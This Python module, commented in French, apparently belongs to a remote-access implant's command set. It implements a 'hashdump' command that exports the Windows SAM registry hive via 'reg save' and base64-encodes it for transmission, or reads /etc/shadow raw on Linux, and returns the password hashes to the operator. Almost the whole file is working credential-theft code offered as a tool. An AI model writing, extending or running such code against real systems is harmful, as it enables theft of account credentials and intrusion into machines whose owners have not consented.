# Ce module implémente une commande de récupération de hash système.
# Elle adapte son comportement selon l’OS :
# - Windows : export de la ruche SAM
# - Linux : lecture de /etc/shadow
# - macOS : non implémenté
#
# Cette commande nécessite généralement des privilèges élevés (admin/root).

import platform
import os
import ctypes
import subprocess
import base64
from pathlib import Path
from .base_command import BaseCommand


class HashdumpCommand(BaseCommand):

    name = "hashdump"
    description = "Retrieve password hashes (requires admin/root)"

    def execute(self, args: str) -> str:

        # Détection automatique du système d’exploitation
        system = platform.system()

        try:
            if system == "Windows":
                return self._windows_dump()

            elif system == "Linux":
                return self._linux_dump()

            elif system == "Darwin":
                return self._macos_dump()

            else:
                return f"Unsupported OS: {system}"

        except Exception as e:
            return f"hashdump error: {e}"

    # Windows – export de la base SAM via reg save
    def _windows_dump(self):

        from pathlib import Path

        # Vérifie les privilèges admin (obligatoire pour accéder à SAM)
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return "Administrator privileges required."

        sam_file = "C:\\Windows\\Temp\\sam_dump"

        # Nettoyage si fichier déjà existant
        Path(sam_file).unlink(missing_ok=True)

        # Export de la ruche SAM
        result = subprocess.run(
            ["reg", "save", "HKLM\\SAM", sam_file, "/y"],
            capture_output=True,
            text=True,
            timeout=10,
        )

        if result.returncode != 0:
            return f"reg save failed: {result.stderr.strip()}"

        # Lecture et encodage base64 pour transmission sécurisée
        data = Path(sam_file).read_bytes()
        sam_b64 = base64.b64encode(data).decode()

        return f"Windows SAM hive (base64):\n{sam_b64}"

    # Linux – lecture directe de /etc/shadow
    def _linux_dump(self):

        shadow = Path("/etc/shadow")

        if not shadow.exists():
            return "Error: /etc/shadow not found"

        # Vérifie les droits root
        if os.geteuid() != 0:
            return "Root privileges required. Run the client with sudo."

        try:
            # Lecture brute du fichier shadow
            return shadow.read_text()

        except PermissionError:
            return "Error: cannot read /etc/shadow – permission denied"

        except Exception as e:
            return f"Linux dump error: {e}"

    # macOS – non implémenté
    def _macos_dump(self):
        return "macOS hashdump not yet implemented"
